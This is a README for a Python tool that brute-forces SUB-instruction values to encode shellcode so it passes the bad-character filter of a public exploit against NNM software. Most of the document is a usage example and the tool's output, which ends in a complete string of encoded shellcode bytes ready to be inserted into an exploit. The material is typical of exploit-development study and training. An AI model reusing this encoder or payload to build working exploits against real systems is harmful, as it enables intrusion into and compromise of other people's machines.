# subencode

Goes about solving the NNM exploit's massive amount of bad characters (https://www.exploit-db.com/exploits/5342/)

Instead of using an algorithm to find the correct values to subtract to reach shellcode, it brute forces the values, starting with a random seed.


# Example
INPUT:

```
python subencode.py goodchars.txt shellcode.txt
```


OUTPUT:
```
[*] Found 121 good characters out of a possible 256
[*] Successfully grabbed shellcode from file
[*] Trying to reach  0xe7ffe775
 [!] Needs to pass 0xffffffff twice
Three SUBs that reach the value -->  0x67537228   0x58565330   0x58565333
Found in  59023  iterations

[*] Trying to reach  0xafea75af
 [!] Needs to pass 0xffffffff twice
Three SUBs that reach the value -->  0x67494762   0x74662176   0x74662179
Found in  318412  iterations

[*] Trying to reach  0xfa8b5730
 [!] Needs to pass 0xffffffff twice
Three SUBs that reach the value -->  0x79042461   0x46384236   0x46384239
Found in  12265  iterations

[*] Trying to reach  0x3054b8ef
Three SUBs that reach the value --> 0x25091465   0x55511955   0x55511957
0x3054b8ef
Found in  18023  iterations

[*] Trying to reach  0x745a053c
Three SUBs that reach the value --> 0x27013802   0x32526160   0x32526162
0x745a053c
Found in  29054  iterations

[*] Trying to reach  0x2ecd5802
Three SUBs that reach the value --> 0x41020310   0x48185276   0x48185278
0x2ecd5802
Found in  13772  iterations

[*] Trying to reach  0x6a52420f
Three SUBs that reach the value --> 0x45493749   0x28324353   0x28324355
0x6a52420f
Found in  20205  iterations

[*] Trying to reach  0xffca8166
 [!] Needs to pass 0xffffffff twice
Three SUBs that reach the value -->  0x16077809   0x75170347   0x7517034a
Found in  42848  iterations

 ---ENCODED SHELLCODE---
\x25\x41\x4d\x4e\x55\x25\x35\x32\x31\x2a\x54\x58\x2d\x66\x4d\x55\x55\x2d\x66\x4b\x55\x55\x2d\x6a\x50\x55\x55\x50\x5c\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x28\x72\x53\x67\x2d\x30\x53\x56\x58\x2d\x33\x53\x56\x58\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x62\x47\x49\x67\x2d\x76\x21\x66\x74\x2d\x79\x21\x66\x74\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x61\x24\x04\x79\x2d\x36\x42\x38\x46\x2d\x39\x42\x38\x46\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x65\x14\x09\x25\x2d\x55\x19\x51\x55\x2d\x57\x19\x51\x55\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x02\x38\x01\x27\x2d\x60\x61\x52\x32\x2d\x62\x61\x52\x32\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x10\x03\x02\x41\x2d\x76\x52\x18\x48\x2d\x78\x52\x18\x48\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x49\x37\x49\x45\x2d\x53\x43\x32\x28\x2d\x55\x43\x32\x28\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x09\x78\x07\x16\x2d\x47\x03\x17\x75\x2d\x4a\x03\x17\x75\x50
```
